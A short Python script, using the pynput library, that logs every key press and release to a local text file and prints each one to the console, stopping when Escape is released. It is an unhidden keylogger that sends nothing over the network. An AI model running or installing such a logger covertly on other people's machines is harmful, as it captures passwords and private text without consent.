from pynput.keyboard import Key, Listener

# File to store the logged key events
log_file = "key_log.txt"

def on_key_press(key):
    """
    This function is called whenever a key is pressed.
    It logs the key press event to a file and prints it to the console.
    """
    try:
        with open(log_file, "a") as file:
            file.write(f"Key pressed: {key.char}\n")
        print(f"Key pressed: {key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"Special key pressed: {key}\n")
        print(f"Special key pressed: {key}")

def on_key_release(key):
    """
    This function is called whenever a key is released.
    It logs the key release event to a file and prints it to the console.
    """
    with open(log_file, "a") as file:
        file.write(f"Key released: {key}\n")
    print(f"Key released: {key}")

    # Stop the listener when the escape key is released
    if key == Key.esc:
        return False

# Set up the listener for key press and release events
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
   listener.join()